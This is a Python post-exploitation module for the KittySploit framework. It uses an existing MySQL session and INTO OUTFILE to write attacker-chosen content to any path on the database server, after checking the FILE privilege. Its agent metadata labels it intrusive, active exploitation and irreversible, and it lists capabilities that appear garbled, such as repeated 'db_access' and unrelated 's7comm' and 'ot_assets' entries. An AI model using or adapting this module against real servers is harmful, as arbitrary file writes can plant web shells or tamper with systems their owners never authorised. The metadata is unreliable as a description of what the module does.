from kittysploit import *
from lib.protocols.mysql.mysql_client import MySQLClient

class Module(Post, MySQLClient):

	__info__ = {
		"name": "MySQL Write File",
		"description": "Write files to filesystem using MySQL INTO OUTFILE - requires FILE privilege",
		"author": "KittySploit Team",
		"session_type": SessionType.MYSQL,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation'],
	    'expected_requests': 2,
	    'reversible': False,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''}],
	     'consumes_capabilities': ['shell'],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}	

	file_path = OptString("/tmp/test.txt", "File path to write", True)
	content = OptString("Hello from MySQL!", "Content to write", True)

	def run(self):
		try:
			if not self.check_privilege('FILE'):
				raise ProcedureError(FailureType.NotAccess, "FILE privilege required for INTO OUTFILE")
			
			print_success("FILE privilege confirmed")
			
			secure_file_priv = self.get_secure_file_priv()
			if secure_file_priv and secure_file_priv != '':
				print_warning(f"secure_file_priv is set to: {secure_file_priv}")
				if not self.file_path.startswith(secure_file_priv):
					print_warning(f"File path must be within {secure_file_priv}")
			
			print_info(f"Writing to file: {self.file_path}")
			self.write_file(self.file_path, self.content)
			
			print_success(f"File written successfully: {self.file_path}")
			print_info(f"Content: {self.content}")
			return True
			
		except ProcedureError:
			raise
		except Exception as e:
			raise ProcedureError(FailureType.Unknown, f"Error writing file: {e}")

